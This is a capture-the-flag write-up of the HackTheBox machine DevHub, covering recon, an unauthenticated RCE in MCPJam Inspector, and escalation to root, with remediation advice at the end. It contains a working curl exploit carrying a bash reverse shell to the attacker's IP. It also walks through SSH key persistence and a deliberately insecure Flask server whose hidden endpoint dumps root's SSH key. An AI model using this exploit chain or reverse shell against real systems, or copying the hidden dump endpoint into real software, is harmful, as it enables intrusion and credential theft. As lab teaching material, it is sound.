# HackTheBox — DevHub (Medium, Linux)

**Target IP:** `10.129.xx.xx`
**VPN/Attacker IP:** `10.10.xx.xx`
**Hostname:** `devhub.htb`

---

## 1. Reconnaissance

### 1.1 Full Port Scan

```bash
nmap -p- 10.129.xx.xx
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-31 02:16 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.22s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
6274/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 415.71 seconds
```

### 1.2 Service/Version Scan

```bash
nmap -p 22,80,6274 -sV -sC 10.129.xx.xx
```

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-31 02:25 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.24s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 <REDACTED_FINGERPRINT> (ECDSA)
|_  256 <REDACTED_FINGERPRINT> (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
6274/tcp open  unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest:
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sun, 31 May 2026 02:31:05 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 02:31:06 GMT
|     Connection: close
|   RTSPRequest:
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sun, 31 May 2026 02:31:07 GMT
|_    Connection: close
1 service unrecognized despite returning data.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 63.96 seconds
```

Three ports of interest: SSH (22), HTTP via nginx (80, redirects to `devhub.htb`), and an unusual service on **6274**. The HTTP response banner on port 6274 reveals it's serving the **MCPJam Inspector** web application.

### 1.3 /etc/hosts Configuration

```bash
cat /etc/hosts
```

```
10.129.xx.xx    devhub.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

---

## 2. Service Identification

Browsing/fingerprinting port **6274** confirms it's running **MCPJam Inspector v1.4.2** — a debugging/inspection tool for MCP (Model Context Protocol) servers.

This version is vulnerable to:

> **CVE-2026-23744** — MCPJam Inspector vulnerability allowing unauthenticated remote command execution via the MCP server connection API.
> Reference: https://github.com/advisories/GHSA-232v-j27c-5pp6

The vulnerability stems from the `/api/mcp/connect` endpoint, which allows a client to specify an arbitrary command and arguments for the Inspector to "connect to" as an MCP server — effectively allowing arbitrary command execution on the host running the Inspector.

---

## 3. Exploitation — Unauthenticated RCE (CVE-2026-23744)

### 3.1 Setting Up the Listener

```bash
penelope -p 4444
```

```
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.xx.xx • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

### 3.2 Crafting the Exploit Request

The `/api/mcp/connect` endpoint accepts a `serverConfig` object specifying a `command` and `args` to launch as if it were a legitimate MCP server process — instead, we point it at `/bin/bash` with a reverse shell one-liner:

```bash
curl -k -X POST "http://devhub.htb:6274/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d '{
    "serverConfig": {
      "command": "/bin/bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1"],
      "env": {}
    },
    "serverId": "exploit"
  }'
```

### 3.3 Catching the Shell

```
penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.xx.xx • 10.10.xx.xx
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from devhub~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
[+] Logging to /home/kali/.penelope/sessions/devhub~10.129.xx.xx-Linux-x86_64/2026_05_31-02_41_01-409.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

We land an interactive (PTY-upgraded) shell as `mcp-dev`, with the inspector running out of `/opt/mcpjam/node_modules/@mcpjam/inspector`.

---

## 4. Lateral Movement — mcp-dev → analyst

### 4.1 SSH Access as mcp-dev

We place a SSH key during the session (`id`), we connect properly over SSH for a more stable session:

```bash
ssh -i id mcp-dev@10.129.xx.xx
```

```
The authenticity of host '10.129.xx.xx (10.129.xx.xx)' can't be established.
ED25519 key fingerprint is: SHA256:<REDACTED>
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:636: [hashed name]
    ~/.ssh/known_hosts:639: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.xx.xx' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 31 02:48:05 AM UTC 2026

  System load:           0.0
  Usage of /:            76.6% of 9.50GB
  Memory usage:          13%
  Swap usage:            0%
  Processes:             226
  Users logged in:       0
  IPv4 address for eth0: 10.129.xx.xx
  IPv6 address for eth0: dead:beef::xxxx:xxxx:xxxx:xxxx

  => There is 1 zombie process.

Last login: Sun May 31 02:48:07 2026 from 10.10.xx.xx
mcp-dev@devhub:~$
```

### 4.2 Process Enumeration

Reviewing running processes reveals two interesting items: an `npm start` process, and a **Jupyter Lab** instance running as a separate user (`analyst`), bound to localhost with a visible access token in the process arguments:

```
2026/05/31 02:48:33 CMD: UID=1001  PID=1041   | npm start
2026/05/31 02:48:33 CMD: UID=1002  PID=1040   | /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=<REDACTED_JUPYTER_TOKEN> --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False
2026/05/31 02:48:33 CMD: UID=0     PID=935    | /usr/sbin/ModemManager
2026/05/31 02:48:33 CMD: UID=0     PID=906    | /usr/libexec/udisks2/udisksd
2026/05/31 02:48:33 CMD: UID=0     PID=905    | /lib/systemd/systemd-logind
```

The Jupyter Lab server is running as the `analyst` user (UID 1002), bound only to `127.0.0.1:8888`, and exposes its access token directly in the command line — a classic information disclosure that enables full code execution within that Jupyter environment.

### 4.3 Locating Additional Files

```bash
mcp-dev@devhub:/opt/opsmcp$ ls -la
```
```
total 16
drwxr-xr-x 2 analyst analyst 4096 May 26 08:42 .
drwxr-xr-x 4 root    root    4096 May 26 08:42 ..
-rw-r----- 1 analyst analyst 6021 Mar 16 21:49 server.py
```

A `server.py` owned by `analyst` exists in `/opt/opsmcp`, but is not yet readable by `mcp-dev` (group-readable by `analyst` only at this point).

### 4.4 Port-Forwarding to Reach Jupyter Lab

Since Jupyter Lab is bound to localhost only, we tunnel it over SSH:

```bash
ssh -i id -L 8888:127.0.0.1:8888 mcp-dev@10.129.xx.xx
```

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...
Last login: Sun May 31 03:26:36 2026 from 10.10.xx.xx
mcp-dev@devhub:~$
```

With the tunnel established, we browse to `http://127.0.0.1:8888` locally and use the leaked `ServerApp.token` value to authenticate into the Jupyter Lab UI. From there, a new terminal/notebook can be spawned, giving code execution **as the `analyst` user**.

### 4.5 Persisting Access as analyst

From within the Jupyter terminal (running as `analyst`), we add our SSH public key to `analyst`'s `authorized_keys`, allowing direct SSH login going forward:

```bash
ssh -i id analyst@10.129.xx.xx
```

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)
...
Last login: Sun May 31 03:30:03 2026 from 10.10.xx.xx
analyst@devhub:~$
```

### 4.6 User Flag

```bash
analyst@devhub:~$ cat user.txt
```
```
<REDACTED_USER_FLAG>
```

---

## 5. Privilege Escalation — OPSMCP Hidden Admin Tool Abuse

### 5.1 Identifying the Privileged Process

Process enumeration shows the `opsmcp` server running **as root**:

```
2026/05/31 02:48:33 CMD: UID=0     PID=1061   | /sbin/agetty -o -p -- \u --noclear tty1 linux
2026/05/31 02:48:33 CMD: UID=0     PID=1047   | /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
2026/05/31 02:48:33 CMD: UID=0     PID=1046   | /usr/sbin/cron -f -P
```

Now logged in as `analyst` (the file's owner), we can finally read `server.py`:

```bash
analyst@devhub:/opt/opsmcp$ cat server.py
```

```python
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401

    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401

    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})

    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400

    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404

    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })

    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })

    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })

    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })

    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })

    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)

        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })

        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })

        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })

        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })

        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })

    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

This is a Flask-based internal "MCP-style" API running as root on `127.0.0.1:5000`, protected by a static API key (`VALID_API_KEY`). Critically, it contains **hidden tools** (`HIDDEN_TOOLS`) — not exposed via `/tools/list`, but still **callable directly** via `/tools/call` since `ALL_TOOLS` (the visible + hidden union) is what's actually checked for validity.

One of these hidden tools, `ops._admin_dump`, can dump:
- The root user's private SSH key (`/root/.ssh/id_rsa`)
- Plaintext/hashed passwords for `root`, `analyst`, and `mcp-dev`
- Internal API tokens

Since we now have the source code, we have the static `VALID_API_KEY`, and can call the hidden endpoint directly.

### 5.2 Dumping Root's SSH Private Key

```bash
analyst@devhub:/opt/opsmcp$ curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'
```

```json
{"note":"Emergency recovery key dump","root_private_key":"-----BEGIN OPENSSH PRIVATE KEY-----\n<REDACTED_BASE64_KEY_DATA>\n-----END OPENSSH PRIVATE KEY-----\n","target":"ssh_keys"}
```

The response contains root's full private SSH key.

### 5.3 Using the Key to Authenticate as Root

The key contents are saved locally (with newlines properly restored) to a file:

```bash
cat key
```
```
-----BEGIN OPENSSH PRIVATE KEY-----
<REDACTED_BASE64_KEY_DATA>
-----END OPENSSH PRIVATE KEY-----
```

```bash
ssh -i key root@10.129.xx.xx
```

```
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun May 31 03:36:17 AM UTC 2026

  System load:           0.01
  Usage of /:            76.7% of 9.50GB
  Memory usage:          21%
  Swap usage:            0%
  Processes:             237
  Users logged in:       2
  IPv4 address for eth0: 10.129.xx.xx
  IPv6 address for eth0: dead:beef::xxxx:xxxx:xxxx:xxxx

Last login: Sun May 31 03:36:18 2026 from 10.10.xx.xx
root@devhub:~#
```

Root access confirmed.

### 5.4 Root Flag

```bash
root@devhub:~# cat root.txt
```
```
<REDACTED_ROOT_FLAG>
```

---

## 6. Attack Chain Summary

| Step | Technique | Result |
|------|-----------|--------|
| 1 | Nmap scan | Identified SSH, nginx (devhub.htb), and MCPJam Inspector on port 6274 |
| 2 | Version fingerprinting | MCPJam Inspector v1.4.2, vulnerable to CVE-2026-23744 |
| 3 | Unauthenticated RCE via `/api/mcp/connect` (malicious `command`/`args`) | Reverse shell as `mcp-dev` |
| 4 | Process enumeration | Found Jupyter Lab (port 8888, localhost-only) running as `analyst` with token leaked in process args |
| 5 | SSH local port-forward to reach Jupyter Lab + token auth | Code execution as `analyst` via Jupyter terminal |
| 6 | Persisted access by adding SSH key to `analyst`'s `authorized_keys` | Stable SSH access as `analyst` |
| 7 | Read `/opt/opsmcp/server.py` (newly accessible as `analyst`) | Discovered hidden, undocumented `ops._admin_dump` API endpoint + static API key |
| 8 | Called hidden endpoint directly via `curl` with the static API key | Dumped root's private SSH key |
| 9 | SSH as root using leaked key | Full root access, root flag captured |

---

## 7. Tools Used

- `nmap` — port/service scanning
- `penelope` — reverse shell listener/handler with auto PTY upgrade
- `curl` — crafting the RCE exploit request and later the hidden API call
- `ssh` — lateral movement, port forwarding, and final root access
- Jupyter Lab (target-hosted) — leveraged for code execution as `analyst`
- Flask `server.py` source review — used to identify the hidden admin API and static key

---

## 8. Key Takeaways / Remediation

1. **Unauthenticated RCE in MCPJam Inspector:** The `/api/mcp/connect` endpoint allowed arbitrary process execution with attacker-controlled `command`/`args` and no authentication — a critical design flaw for any tool that proxies command execution. Patch to the fixed version and restrict the inspector to trusted networks/localhost only.
2. **Secrets Leaked via Process Arguments:** The Jupyter Lab `--ServerApp.token=...` was visible to any local user via `ps`/process listings. Sensitive tokens should never be passed as CLI arguments; use config files with restricted permissions or environment variables scoped to the process only.
3. **"Security by Obscurity" Hidden API Endpoints:** The `opsmcp` service hid sensitive admin tools (`ops._admin_dump`, `ops._debug_mode`) from its `/tools/list` discovery endpoint, but the backend still executed them if called directly by name. Hiding an endpoint from a listing is not access control — the API key alone was the only real protection, and it was a static, hardcoded value in source code.
4. **Hardcoded Static API Keys & Reading Root's Private Key Over HTTP:** The `VALID_API_KEY` was hardcoded in plaintext in the script, and the "emergency recovery" dump feature directly exposed `/root/.ssh/id_rsa` content over an HTTP API — an extremely dangerous design pattern. Sensitive key material should never be retrievable via an application API, and credentials/secrets should be stored in a vault or secrets manager rather than in source code.
5. **Privilege Boundary Crossing via Local Services:** A chain of locally-trusted, lower-privilege services (Jupyter as `analyst`, an "internal ops" Flask app as `root`) created a privilege escalation path purely through information disclosure — no traditional binary exploitation was needed. Service-to-service trust boundaries should be reviewed carefully, especially when one service can be reached and abused by a lower-privileged local user.

---
